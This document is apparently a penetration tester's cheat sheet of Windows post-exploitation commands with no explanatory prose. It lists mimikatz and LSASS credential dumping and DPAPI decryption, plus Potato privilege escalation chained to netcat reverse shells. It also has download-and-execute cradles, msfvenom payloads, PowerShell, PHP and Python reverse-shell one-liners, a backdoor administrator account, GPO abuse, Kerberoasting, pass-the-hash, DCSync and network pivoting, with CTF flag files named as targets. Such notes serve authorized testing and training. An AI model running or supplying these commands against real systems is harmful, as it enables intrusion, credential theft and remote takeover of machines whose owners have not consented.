lsadump::secrets
vault::list
vault::cred /patch
sekurlsa::dpapi

+---------- DPAPI ----------+
mkdir dpapi
IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/dpapi.ps1')
download ...\S-1-5...\7dc6a492-36e2-4c2d-be66-ba29d263dda2 dpapi/
download ...\Credentials\936A68B5AC87C545C4A22D1AF264C8E9 dpapi/
impacket-dpapi masterkey -file dpapi/7dc6a492-36e2-4c2d-be66-ba29d263dda2 -sid S-1-5... -password OF_DPAPI_USER | grep 'Decrypted key:'
impacket-dpapi credential -file dpapi/936A68B5AC87C545C4A22D1AF264C8E9 -key 0xdcd70638e50e...
rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\mimikatz.exe'
dpapi::masterkey /in:"...\<USER>\...\...\Microsoft\Protect\<USER_SID>\<CRED_FILE>" /sid:<USER_SID> /rpc
dpapi::masterkey /in:"...\<USER>\...\...\Microsoft\Protect\<USER_SID>\<CRED_FILE>" /sid:<USER_SID> /password:$PASSWORD /protected
dpapi::cred /masterkey:<MASTER_KEY> /in:"...\<USER>\...\...\Microsoft\Credentials\<ENCRYPTED_FILE>"

+---------- SeBackupPrivilege ----------+
$a = [System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$MYIP:53/windows/SeBackupPrivilegeUtils.dll')); Get-ChildItem C:\Users -Recurse -File -Include user.txt,root.txt | ForEach-Object {$d=Join-Path $env:TEMP "$([guid]::NewGuid()).txt"; [bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils]::CopyFile($_.FullName,$d,[ref]$true,$true)>$null; Get-Content $d; Remove-Item $d -Force}
robocopy /b \users\administrator\desktop\ .; type \users\administrator\desktop\root.txt
$a.GetExportedTypes() | ForEach-Object { $_.FullName }
[bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils].GetMethods() | ft Name, IsStatic, ReturnType

+---------- SeImpersonatePrivilege ----------+
curl $MYIP:53/windows/EfsPotato.exe -o EfsPotato.exe
curl $MYIP:53/windows/nc.exe -o nc.exe
./EfsPotato.exe "nc.exe $MYIP 80 -e cmd"
forfiles /p C:\Windows\System32 /m cmd.exe /c "cmd /c \\$MYIP\$\EfsPotato.exe """powershell -c IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:53/resh.ps1');resh -Reverse $MYIP -Port 5566"""
wmic process call create "\\$MYIP\$\EfsPotato.exe \"\\$MYIP\$\nc.exe $MYIP 80 -e cmd\""
wmic process call create "\\$MYIP\$\jp32.exe -l 1337 -p \"cmd.exe\" -a \"/c \\$MYIP\$\nc.exe $MYIP 80 -e cmd\"  -t * -c {3c6859ce-230b-48a4-be6c-932c0c202048}
wmic process call create "\\$MYIP\$\churrasco.exe -d \"\\$MYIP\$\nc.exe -e cmd.exe $MYIP 80\""

+---------- SeDebugPrivilege ----------+
curl $MYIP/windows/procdump64.exe -o \programdata\procdump.exe; \programdata\procdump.exe -accepteula -ma lsass.exe lsass.dmp
curl $MYIP/windows/mimikatz.exe -o \programdata\mimikatz.exe; \programdata\mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
vault::cred
lsadump::sam
lsadump::secrets

+---------- DnsAdmins ----------+
rlwrap nc -lvnp 80
impacket-smbserver $ /Upload/windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=80 -f dll -o /Upload/windows/x.dll
dnscmd.exe /config /serverlevelplugindll \\$MYIP\$\x.dll

+---------- Dump Hashes ----------+
powershell -c "net user dbf 123qweasdF! /add ; net localgroup Administrators dbf /add"
nxc smb $TARGET -u 'dbf' -p '123qweasdF!' -M lsassy --local-auth
nxc smb $TARGET -u 'dbf' -p '123qweasdF!' --sam --lsa --dpapi --local-auth
impacket-secretsdump 'dbf':'123qweasdF!'@$TARGET
nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --use-kcache --lsa --sam --dpapi --ntds --user Administrator

+---------- Spray Hashes ----------+
nxc winrm 192.168.110.51-56 -u usernames -H hashes --local-auth
nxc smb 192.168.110.51-56 -u usernames -H hashes --local-auth --shares

+---------- Malicious .lnk ----------+
curl $MYIP/windows/nc.exe -o \programdata\nc.exe
powershell -c "$s = New-Object -ComObject WScript.Shell; $sc = $s.CreateShortcut('C:\Common Applications\Notepad.lnk'); $sc.TargetPath = 'C:\programdata\nc.exe'; $sc.Arguments = '$TARGET 5566 -e cmd.exe'; $sc.Save()"
powershell -c "$s = New-Object -ComObject WScript.Shell; $sc = $s.CreateShortcut('C:\Common Applications\Notepad.lnk'); $sc.TargetPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; $sc.Arguments = '\\$TARGET\\x'; $sc.Save()"

+---------- Enumerate Certificate Services ----------+
certutil -ADCA
certutil -user
certutil -CATemplates -config mist-DC01-CA
certutil -Template User

+---------- File Permissions ----------+
icacls "flag.txt"
icacls "flag.txt" /grant "Everyone:(F)"
powershell -c "(Get-Acl 'C:\secret.txt').Access | Format-Table"
takeown /f "C:\secret.txt" && icacls "C:\secret.txt" /grant %USERNAME%:F /inheritance:e

+---------- Scheduled Tasks ----------+
powershell -c "$task = Get-ScheduledTask -TaskName 'Ownership'; $task.Actions; $task.Triggers; $task.Settings; $task | Format-List *"
powershell -c "Start-ScheduledTask -TaskName 'Ownership'"

[*] Pivoting
-->> Ligolo: New Configuration
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:8080
curl $MYIP/windows/agent.exe -o \programdata\agent.exe && C:\programdata\agent.exe -ignore-cert -connect $MYIP:8080
session 1
interface_create --name ligolo
tunnel_start --tun ligolo
ifconfig
interface_add_route --name ligolo --route 240.0.0.1/32
interface_add_route --name ligolo --route 192.168.110.51/24

-->> Ligolo: Reset
stop,  interface_delete --name ligolo,  start

-->> Ligolo: Attack Single
chromium 240.0.0.1:3000
curl 240.0.0.1:5000

-->> Ligolo: Attack Multiple
nbtscan-unixwiz 192.168.110.51/24
fping -ag 192.168.110.51/24
sudo nmap -n -Pn -sS '192.168.110.51/24' -p21,22,23,25,53,79,80,88,135,139,389,443,445,512,513,514,1433,1521,2049,2375,3306,3389,5985,10249,10250 --open --min-rate 250 --max-rate 500 -vvvv 2>&1 | stdbuf -oL grep --color=never -oP '(?<=on )\d{1,3}(?:\.\d{1,3}){3}' | tee tmp.hosts
sort -nu -t . -k1,1 -k2,2 -k3,3 -k4,4 tmp.hosts | tee hosts_
sudo nmap -n -Pn -sS -iL hosts_ --open --max-rate 50 -oA 'TCP_$TARGET__24'
sudo nmap -n -Pn -sS '$TARGET/24' --excludefile hosts_ -F --open --max-rate 50 -oA 'TCP_ALL_$TARGET__24'

[*] Meterpreter
+---------- Initial Shell ----------+
-->> Standard
rlwrap msfconsole -q -x "use multi/handler; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; setg LHOST $MYIP; setg LPORT 4444; run"

-->> Web Delivery
msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SESSION 1; setg SRVPORT 8888; setg LHOST $MYIP; setg LPORT 80; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'

+---------- Stored Credentials ----------+
run post/windows/gather/credentials/windows_autologin
run post/windows/gather/credentials/gpp
run post/windows/gather/enum_unattend
run post/windows/gather/credentials/enum_cred_store

+---------- Exploit Suggester ----------+
run multi/recon/local_exploit_suggester

+---------- Load Modules ----------+
load kiwi
load powershell

+---------- Initial Checks ----------+
powershell_execute "whoami /user /priv"
powershell_execute "cd \users; tree /a /f"
getsystem
sysinfo
ps
migrate

+---------- Installed Apps ----------+
powershell_execute "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"

+---------- Services and Unquoted Paths ----------+
powershell_execute "Get-Service | Where-Object { $_.CanStop -eq $true -and $_.DisplayName -notmatch 'Microsoft|Windows' } | Sort-Object DisplayName"
powershell_execute "wmic service get name,displayname,pathname,startmode |findstr /i 'auto' |findstr /i /v 'c:\windows'"

+---------- Scheduled Tasks ----------+
powershell_execute "Get-ScheduledTask | Where-Object {($_.Author -notmatch 'Microsoft') -and ($_.TaskPath -notmatch 'Microsoft')} | Select-Object TaskName, TaskPath, State, Author"
powershell_execute "$task = Get-ScheduledTask -TaskName 'Ownership'; $task.Actions; $task.Triggers; $task.Settings; $task; $filePath = $task.Actions.Execute; Get-Acl $filePath | Select-Object PSChildName, PSPath, AccessToString"
powershell_execute "Start-ScheduledTask -TaskName 'Ownership'"

+---------- PowerShell History ----------+
powershell_execute "type (Get-PSReadLineOption).HistorySavePath"

+---------- Network Environment ----------+
powershell_execute "powershell -c \"& { Get-NetTCPConnection -State Listen,Established | Where-Object { `$_."LocalAddress" -notin @('0.0.0.0','127.0.0.1') -and `$_."RemoteAddress" -notmatch '::' } | Sort-Object LocalAddress,LocalPort | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State | Format-Table -AutoSize }\""
powershell_execute "arp -a"
powershell_execute "arp -a -N 10.1.5.4"
powershell_execute "route print"
powershell_execute "ipconfig /all"

+---------- Dumping ----------+
creds_all
hashdump
kiwi_cmd "lsadump::dcsync /domain:$DOM /all /csv"
run post/windows/gather/smart_hashdump
run post/windows/gather/lsa_secrets

+---------- File Permissions ----------+
powershell_execute "(Get-Acl 'C:\secret.txt').Access | Format-Table"
powershell_execute "takeown /f 'C:\secret.txt' && icacls 'C:\secret.txt' /grant %USERNAME%:F /inheritance:e"

+---------- Domain Environment ----------+
run post/windows/gather/enum_ad_users
run post/windows/gather/enum_ad_computers
run post/windows/gather/enum_domain
run post/windows/gather/enum_domains

+---------- Sessions and Jobs ----------+
background
sessions
sessions -i 1
jobs
jobs -k 1

[*] MSFVenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=80 -f exe -o 0.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=80 -f msi -o 0.msi
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=80 -f dll -o 0.dll
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=80 -f aspx -o 0.aspx
msfvenom -p php/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=80 -f raw -o 0.php
msfvenom -p python/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=80 -f raw -o 0.py

[*] Reverse Shells
php -r '$sock=fsockopen("$MYIP",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$MYIP",5555)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
powershell -nop -c "$AtpsZlvw99=New-Object System.Net.Sockets.TCPClient('$MYIP',5555);$DqvVumCJ99=$AtpsZlvw99.GetStream();[byte[]]$bytes=0..65535|ForEach-Object{0};while(($i=$DqvVumCJ99.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$fjVAQFpJ99=(Invoke-Expression $data 2>&1|Out-String);$vpVmHTLx99=$fjVAQFpJ99+'PS '+(Get-Location).Path+'> ';$BaZSdidm99=[System.Text.Encoding]::ASCII.GetBytes($vpVmHTLx99);$DqvVumCJ99.Write($BaZSdidm99,0,$BaZSdidm99.Length);$DqvVumCJ99.Flush()};$AtpsZlvw99.Close()"
powershell -nop -c "$sm=(New-Object Net.Sockets.TCPClient('$MYIP',5555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"

[*] Powerview
Import-Module ./PowerView.ps1
Get-NetDomain
Get-LocalUser
Get-ADuser gpoadm | ForEach-Object {Get-ACL "AD:\$($_.DistinguishedName)" | Select-Object -ExpandProperty Owner}
Set-DomainObjectOwner -Identity gpoadm -OwnerIdentity Amelia.Griffiths
Add-DomainObjectAcl -TargetIdentity gpoadm -PrincipalIdentity Amelia.Griffiths -Rights All
Set-DomainUserPassword -Identity gpoadm -AccountPassword (ConvertTo-SecureString "123qweasdF!" -AsPlainText -Force)
python3 pygpoabuse.py -dc-ip $TARGET $DOM/'gpoadm':'123qweasdF!' -gpo-id '31b2f340-016d-11d2-945f-00c04fb984f9' -command 'mshta http://10.8.5.79:8080/buqT7ygPVm.hta'
gpoupdate /force
Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get-DomainSPNTicket -spn SET/SET

[*] Rubeus
Rubeus.exe kerberoast
nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=$rockyou --format=krb5tgs
Rubeus.exe asreproast
nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=$rockyou --format=krb5asrep

# Pivoting
## Linux
## Windows
[*] Meterpreter
+---------- Create Route ----------+
run post/multi/manage/autoroute

+---------- Discover Hosts ----------+
run post/windows/gather/enum_domain
run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24 BATCHSIZE=32 THREADS=24

+---------- Port Scan Hosts ----------+
background
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.1.5.3
set PORTS 21,22,23,53,88,135,389,445,1433,2049,3306,3389,5985
set CONCURRENCY 20
set TIMEOUT 20
set THREADS 20

+---------- Setup Socks Proxy ----------+
run auxiliary/server/socks_proxy SRVHOST=127.0.0.1 SRVPORT=9050 VERSION=4a
cp /etc/proxychains.conf /etc/proxychains.conf.backup
echo "socks4 127.0.0.1 9050" >> /etc/proxychains.conf ; nano /etc/proxychains.conf

+---------- Scan Services ----------+
proxychains nmap -Pn -n -sT 10.1.5.3 --open -p 21,22,23,53,88,135,389,445,1433,2049,3306,3389,5985 -g53

+---------- Attacking Internal Hosts ----------+
use exploit/windows/smb/psexec
set LHOST 10.10.10.3
set RHOSTS 10.10.10.1-2
set SMBUser Administrator
set SMBPass be77c30f5bb90694f6fd9e48f380c9c3:6aa6bca0dafa60871fa5ecaf2217e05f
run

+---------- Managing Routes ----------+
route
run post/multi/manage/autoroute ACTION=delete
jobs -v
jobs -k 0

+---------- Port Forwarding ----------+
portfwd add -l 65001 -r 10.10.10.1 -p 445
portfwd add -l 65002 -r 10.10.10.2 -p 445
portfwd add -l 65020 -r 10.10.10.20 -p 445
portfwd add -l 65200 -r 10.10.10.200 -p 445
portfwd list
portfwd flush

[*] Manual
arp -a
for /L %i in (1,1,254) do ping -n 1 192.168.1.%i

[*] Pass The Hash
meterpreter> hashdump
DUMP=''
echo "$DUMP" | cut -d ':' -f 1 >> usernames; cat usernames | sort -u | tee usernames
echo "$DUMP" | cut -d ':' -f 3- | sed 's/::.*//' >> hashes; cat hashes | sort -u | tee hashes

+---------- Proxychains ----------+
proxychains nxc smb 10.129.121.240 -u usernames -H hashes -x 'net user sysadm 123qweasdF!'
proxychains nxc smb 10.10.10.1 10.10.10.2 -u usernames -H hashes --local-auth --continue-on-success | grep '\[+\]'
proxychains nxc smb 10.10.10.2 -u '$USERNAME' -H '$HASH' --local-auth --sam | grep ':[0-9]\+:[a-f0-9]\{32\}:[a-f0-9]\{32\}:::' | awk '{print $NF}'
proxychains nxc smb 10.10.10.2 -u '$USERNAME' -H '$HASH' --local-auth --sam --lsa --dpapi --ntds
proxychains nxc smb 10.10.10.2 -u '$USERNAME' -H '$HASH' --local-auth -M reg-winlogon -M lsassy -M powershell_history

+---------- Impacket ----------+
impacket-psexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET
impacket-wmiexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET
impacket-smbexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET
impacket-atexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET "whoami /all"
impacket-atexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
impacket-psexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
impacket-wmiexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
impacket-smbexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
